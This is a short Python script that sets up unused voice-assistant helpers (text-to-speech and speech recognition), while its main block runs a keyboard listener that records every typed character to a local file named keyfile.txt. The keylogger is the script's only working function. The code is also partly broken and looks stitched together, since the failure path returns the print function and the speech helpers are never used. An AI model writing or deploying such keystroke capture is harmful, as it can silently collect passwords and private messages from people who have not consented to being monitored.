from pynput import keyboard
import speech_recognition
import pyttsx3


engine = pyttsx3.init("sapi5")
voices = engine.getProperty("voices")
engine.setProperty("voice", voices[1].id)
engine.setProperty("rate",170)
rate = engine.setProperty("rate",170)

def speak(audio):
    engine.say(audio)
    engine.runAndWait()

def takeCommand():
    r = speech_recognition.Recognizer()
    with speech_recognition.Microphone() as source:
        print("listening...")
        r.pause_threshold = 1
        r.energy_threshold = 250
        audio = r.listen(source,0,4)
    try:
        print("understand...")
        query = r.recognize_google(audio,language='en-in')
        print(f"you said: {query}\n")

    except Exception:
        print("say that again")
        return print
    return query

def keyPressed(key):
    print(str(key))
    with open("keyfile.txt", 'a') as logKey:
        try:
            char = key.char
            logKey.write(char)
        except:
            print("getting char")

if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    input()

